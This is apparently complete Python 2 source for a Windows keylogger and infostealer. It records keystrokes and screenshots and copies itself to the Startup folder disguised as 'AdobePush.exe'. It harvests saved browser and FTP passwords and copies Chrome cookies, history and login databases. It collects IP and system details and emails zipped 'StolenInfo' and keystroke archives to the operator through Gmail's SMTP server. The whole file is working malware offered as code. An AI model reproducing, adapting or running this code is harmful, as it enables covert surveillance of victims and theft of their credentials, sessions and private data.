#import win32api
#import win32console
#import win32gui
#win=win32console.GetConsoleWindow()
#win32gui.ShowWindow(win,0)

import pythoncom, pyHook, sys, logging
import os
import os.path
import sys
import datetime
from pyHook import GetKeyState

import urllib2
import platform
import win32api
import shutil
import subprocess
import base64
import getpass
import socket
import smtplib

from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email import Encoders

from PIL import ImageGrab
from Recoveries import Test
from shutil import copy2


LOG_DIR = 'C:\Users\Public\Logs\\'
ZIP_DIR = 'C:\Users\Public\Logs\Info\\'
SCR_DIR = 'C:\Users\Public\Logs\KeyStrokes\Screenshots\\'
COOKIES_DIR = 'C:\Users\Public\Logs\Info\Cookies\\'
KS_DIR = 'C:\Users\Public\Logs\KeyStrokes\\'

LOG_FILE = KS_DIR + 'KeyStrokes.txt'

passkey = ""  #Password to connect to GMAIL smtp server
userkey = ""  #Username to connect to GMAIL smtp server

buffer = ''
SMTP_SERVER = "smtp.gmail.com"  #SMTP server address

current_system_time = datetime.datetime.now()
currentuser = getpass.getuser()  #Get current User
count_str = 0

currentdir = os.getcwd()    #Get current working directory

first = False

try:
    ip_address = socket.gethostbyname(socket.gethostname()) #Get Ip address
except:
    pass

if not os.path.exists(LOG_DIR):
	first = True
	os.mkdir(LOG_DIR)
	
if not os.path.exists(ZIP_DIR):
	os.mkdir(ZIP_DIR)
	
if not os.path.exists(COOKIES_DIR):
	os.mkdir(COOKIES_DIR)
	
if not os.path.exists(KS_DIR):
	os.mkdir(KS_DIR)
	
if not os.path.exists(SCR_DIR):
	os.mkdir(SCR_DIR)
else:
	nks = os.listdir(SCR_DIR)
	count_str = len(nks)
	
#Function to check if the computer is connected to Internet
def internet_on():
    try:
        response = urllib2.urlopen('https://www.google.co.in', timeout=20)
        return True
    except urllib2.URLError as err:
        pass
    return False
	
def subprocess_args(include_stdout=True):
    if hasattr(subprocess, 'STARTUPINFO'):
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        env = os.environ
    else:
        si = None
        env = None

    if include_stdout:
        ret = {'stdout:': subprocess.PIPE}
    else:
        ret = {}

    ret.update({'stdin': subprocess.PIPE,
                'stderr': subprocess.PIPE,
                'startupinfo': si,
                'env': env })
    return ret
	
def copytostartup():
	try:
		#ori_file = "key2.exe"
		des_file = "AdobePush.exe"
		des_dir = 'C://Users//' + currentuser + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//'
		ori_dir = sys.argv[0]
		copy2(ori_dir, des_dir)
	except Exception as e:
		print e
		
#Function to get save passwords from browsers, ftp clients and other programs
def getpasswords():
	passwords = Test.Result()
	passw = ''
	run = passwords.run()
	for i in range(len(run)):
		if(isinstance(run[i],list)):
			if(len(run[i]) > 0):
				for j in (range(len(run[i]))):
					passw += ('	' + str(run[i][j]) + '\n')
		else:
			if(i % 2 == 1):
				passw += '	'
			passw += (str(run[i]) + '\n')
			
		
	slave_info = ZIP_DIR + 'passwords.txt'
	open_slave_info = open(slave_info, "w")
	try:
		open_slave_info.write(passw + "\n")
	except Exception as e:
		print e
	open_slave_info.close()

#Function to get the Public IP
def getpublicip():
	slave_info = ZIP_DIR + 'publicIP.txt'
	open_slave_info = open(slave_info, "w")
	try:
		info = urllib2.urlopen('http://ip.42.pl/raw').read()
		open_slave_info.write(info + "\n")
	except Exception as e:
		print e
	open_slave_info.close()
	
def getsysinfo():
	info = platform.uname()
	slave_info = ZIP_DIR + 'sysinfo.txt'
	open_slave_info = open(slave_info, "w")
	try:
		open_slave_info.write(' '.join(str(s) for s in info) + '\n')
	except Exception as e:
		print e
		
#Function to list directories content upto 4 level --> at least 20 sec to finish
def driveTree():
    file_dir1 = ZIP_DIR + 'Dir_View.txt'   #The drive hierarchy will be saved in this file
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    no_of_drives = len(drives)
    file_dir_O = open(file_dir1, "w")

    for d in range(no_of_drives):
        try:
            file_dir_O.write(str(drives[d]) + "\n")
            directories = os.walk(drives[d])
            next_dir = next(directories)

            next_directories = next_dir[1]
            next_files = next_dir[2]

            next_final_dir = next_directories + next_files

            for nd in next_final_dir:
                file_dir_O.write("	" + str(nd) + "\n")
                try:
                    sub_directories = os.walk(drives[d] + nd)

                    next_sub_dir = next(sub_directories)[1]
                    next_sub_sub_file = next(sub_directories)[2]

                    next_final_final_dir = next_sub_dir + next_sub_sub_file

                    for nsd in next_final_final_dir:
                        file_dir_O.write("		" + str(nsd) + "\n")
						
                        try:
                            sub_sub_directories = os.walk(drives[d] + nd + '\\' + nsd)

                            next_sub_sub_dir = next(sub_sub_directories)[1]
                            next_sub_sub_sub_file = next(sub_sub_directories)[2]

                            next_final_final_final_dir = next_sub_sub_dir + next_sub_sub_sub_file

                            for nssd in next_final_final_final_dir:
								file_dir_O.write("			" + str(nssd) + "\n")
								try:
									sub_sub2_directories = os.walk(drives[d] + nd + '\\' + nsd + '\\' + nssd)

									next_sub_sub2_dir = next(sub_sub2_directories)[1]
									next_sub_sub_sub2_file = next(sub_sub2_directories)[2]

									next_final_final_final2_dir = next_sub_sub2_dir + next_sub_sub_sub2_file

									for nss2d in next_final_final_final2_dir:
										file_dir_O.write("				" + str(nss2d) + "\n")	
								
								except Exception as e:
									pass
								
                        except Exception as e:
                            pass

                except Exception as e:
                    pass
        except Exception as e:
            pass

    file_dir_O.close()
    return True
	
#Fucntion to steal chrome cookies
def getChromeCookies():
    cookiepath = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Local\Google\Chrome\User Data\Default'

    cookiefile = 'Cookies'
    historyfile = 'History'
    LoginDatafile = "Login Data"

    copycookie = cookiepath + "\\" + cookiefile
    copyhistory = cookiepath + "\\" + historyfile
    copyLoginData = cookiepath + "\\" + LoginDatafile

    filesindir = os.listdir(COOKIES_DIR)

    if copycookie not in filesindir:
        try:
            shutil.copy2(copycookie, COOKIES_DIR)
        except:
            pass


    if copyhistory not in filesindir:
        try:
            shutil.copy2(copyhistory, COOKIES_DIR)
        except:
            pass


    if copyLoginData not in filesindir:
        try:
            shutil.copy2(copyLoginData, COOKIES_DIR)
        except:
            pass

    return True
	
#Function to get the output of command ipconfig /all
def getipconfig():
    try:
        ipcfg_file = ZIP_DIR + 'ipcfg.txt'
        f = open(ipcfg_file, "w")
        f.write(subprocess.check_output(["ipconfig", "/all"], **subprocess_args(False)))
        f.close()
    except Exception as e:
        print e
		
def zipFiles(name):
	if name == 'Info':
		arch_name = LOG_DIR + "StolenInfo"
		files = os.listdir(ZIP_DIR)

		try:
			shutil.make_archive(arch_name, 'zip', ZIP_DIR)
			shutil.rmtree(ZIP_DIR)
		except Exception as e:
			print e
			
	elif name == 'KeyStrokes':
		arch_name = LOG_DIR + "KeyStrokes"
		files = os.listdir(KS_DIR)
		
		try:
			shutil.make_archive(arch_name, 'zip', KS_DIR)
			erase = open(KS_DIR + "KeyStrokes.txt", 'w')
			erase.close()
			shutil.rmtree(SCR_DIR)
			os.mkdir(SCR_DIR)
		except Exception as e:
			print e
	return True
		
def sendData(fname, fext):
    attach = LOG_DIR + fname + fext

    ts = current_system_time.strftime("%Y%m%d-%H%M%S")
    SERVER = SMTP_SERVER
    PORT = 465
    USER = userkey
    PASS = passkey
    FROM = USER
    TO = userkey

    SUBJECT = "Attachment " + "From --> " + currentuser + " Time --> " + str(ts)
    TEXT = "This attachment is sent from python" + '\n\nUSER : ' + currentuser + '\nIP address : ' + ip_address

    message = MIMEMultipart()
    message['From'] = FROM
    message['To'] = TO
    message['Subject'] = SUBJECT
    message.attach(MIMEText(TEXT))

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attach, 'rb').read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
    message.attach(part)

    try:
        server = smtplib.SMTP_SSL()
        server.connect(SERVER, PORT)
        server.ehlo()
        server.login(USER, PASS)
        server.sendmail(FROM, TO, message.as_string())
        server.close()
    except Exception as e:
        print e

    return True
	
def removeFiles(name):
	arch_name = LOG_DIR + name
	try:
		os.remove(arch_name)
	except Exception as e:
		print e
		
#Function to send key strokes via email
def sendKeyStrokes():
    attach = LOG_DIR + 'KeyStrokes.zip'

    ts = current_system_time.strftime("%Y%m%d-%H%M%S")
    SERVER = SMTP_SERVER
    PORT = 465
    USER = userkey
    PASS = passkey
    FROM = USER
    TO = userkey

    SUBJECT = "KeyStrokes " + "From --> " + currentuser + " Time --> " + str(ts)
    TEXT = "This attachment is sent from python" + '\n\nUSER : ' + currentuser + '\nIP address : ' + ip_address

    message = MIMEMultipart()
    message['From'] = FROM
    message['To'] = TO
    message['Subject'] = SUBJECT
    message.attach(MIMEText(TEXT))

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attach, 'rb').read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
    message.attach(part)

    try:
        server = smtplib.SMTP_SSL()
        server.connect(SERVER, PORT)
        server.ehlo()
        server.login(USER, PASS)
        server.sendmail(FROM, TO, message.as_string())
        server.close()
    except Exception as e:
        print e

    return True
		
def OnKeyboardEvent(event):
	global buffer
	global count_str
	
#	print 'MessageName:',event.MessageName
#	print 'Message:',event.Message
#	print 'Time:',event.Time
#	print 'Window:',event.Window
#	print 'WindowName:',event.WindowName
#	print 'Ascii:', event.Ascii, chr(event.Ascii)
#	print 'Key:', event.Key
#	print 'KeyID:', event.KeyID
#	print 'ScanCode:', event.ScanCode
#	print 'Extended:', event.Extended
#	print 'Injected:', event.Injected
#	print 'Alt', event.Alt
#	print 'Transition', event.Transition
#	print 'Flags:',event.flags
#	print '---'
	
	logging.basicConfig(filename=LOG_FILE,
                        level=logging.DEBUG,
                        format='%(message)s')
						
	if (event.Ascii == 13 or event.KeyID == 9) and len(buffer) > 0:
		buffer = datetime.datetime.now().strftime("%d/%m/%Y-%H:%M:%S") + ": " + buffer
		logging.log(10, buffer)
		buffer = ''
		takeScreen()
		count_str += 1
	elif event.Ascii == 8:
		buffer = buffer[:-1]
	elif event.Ascii == 9:
		keys = '\t'
		buffer = buffer + keys
	elif event.Ascii >= 32 and event.Ascii <= 127:
		keys = chr(event.Ascii)
		buffer = buffer + keys
	
	
	if GetKeyState(162) and GetKeyState(164) and event.KeyID == 80:
		sys.exit()
		exit()
		
	if count_str == 10:
		zipFiles('KeyStrokes')
		sendKeyStrokes()
		removeFiles("KeyStrokes.zip")
		count_str = 0
		
	return True
	
def OnMouseEvent(event):
	
	if event.Message == 513:
		msg = 256
		vk_code = 13
		scan_code = 28
		ascii = 13
		flags = 0
		time = event.Time
		hwnd = event.Window
		win_name = event.WindowName
		hm.KeyboardSwitch(msg, vk_code, scan_code, ascii, flags, time, hwnd, win_name)

# return True to pass the event to other handlers
	return True

def takeScreen():
	d = datetime.datetime.now().strftime('%Y%m%d-%H%M%S')
	
	scr = str(d)
	
	checkfilename = (scr + '.png')
	dircontent = os.listdir(SCR_DIR)
	
	con = 1
	
	while checkfilename in dircontent:
		if con == 1:
			scr += '(' + str(con) + ')'
		else:
			scr = (str(d) + '(' + str(con) + ')')
		con+=1
		checkfilename = (scr + '.png')
	
	img = ImageGrab.grab()
	img.save(SCR_DIR + scr + '.png')

if first:
	copytostartup()
	getpasswords()	
	getpublicip()
	getsysinfo()
	getipconfig()
	#driveTree()
	try:
		getChromeCookies()
	except:
		pass
	zipFiles('Info')
	if internet_on() == True:   #If internet is On
		sendData("StolenInfo", ".zip")
	removeFiles("StolenInfo.zip")

	
#print('finished')
	
# create a hook manager
hm = pyHook.HookManager()
# watch for all mouse events
hm.MouseLeftDown = OnMouseEvent
# set the hook
hm.HookMouse()
# wait forever

hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()

pythoncom.PumpMessages()